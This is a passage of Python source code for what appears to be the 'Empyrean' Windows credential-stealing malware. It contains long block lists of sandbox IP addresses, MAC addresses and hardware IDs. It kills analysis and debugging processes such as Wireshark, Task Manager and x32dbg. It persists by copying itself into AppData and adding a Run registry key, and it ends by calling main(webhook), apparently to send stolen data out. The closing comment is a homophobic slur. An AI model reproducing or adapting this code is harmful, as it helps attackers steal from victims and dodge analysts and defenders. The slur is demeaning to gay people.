'3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
        
        self.check_process()
        if self.get_network(): debugging = True
        if self.get_system(): debugging = True
  
        return debugging

    def check_process(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
     
    def get_network(self):
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        if ip in self.blackListedIPS: return True	
        if mac in self.blackListedMacs: return True
        
    def get_system(self):
        hwid = (subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read() + subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stderr.read()).decode().split("\n")[1]     
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        
        if hwid in self.blackListedHWIDS: return True
        if username in self.blackListedUsers: return True
        if hostname in self.blackListedPCNames: return True
    
    def self_destruct(self):
        exit()

class startup():
    def __init__(self):
        if not self.check(): return
    
        self.Empyrean_dir = self.mk_appdata()
        self.mv_self()
        self.reg_add()
    
    def check(self):
        if os.path.splitext(__file__)[1] == ".exe":
            return True
        else:
            return False
    
    def mk_appdata(self):
        roaming = os.getenv("APPDATA")
        
        shutil.rmtree(roaming + "\\" + "Empyrean") if os.path.exists(roaming + "\\" + "Empyrean") else None
        
        os.mkdir(roaming + "\\" + "Empyrean")
        
        Empyrean_dir = roaming + "\\" + "Empyrean" if os.path.exists(roaming + "\\" + "Empyrean") else None
            
        return Empyrean_dir
    
    def mv_self(self):
        shutil.copy2(__file__, self.Empyrean_dir + "\\" + os.path.basename(__file__))

    def reg_add(self):
        subprocess.call(["reg", "delete", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/f"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/t", "REG_SZ", "/d", self.Empyrean_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  
if __name__ == "__main__":
    main(webhook)
    
# 600 lines of gay code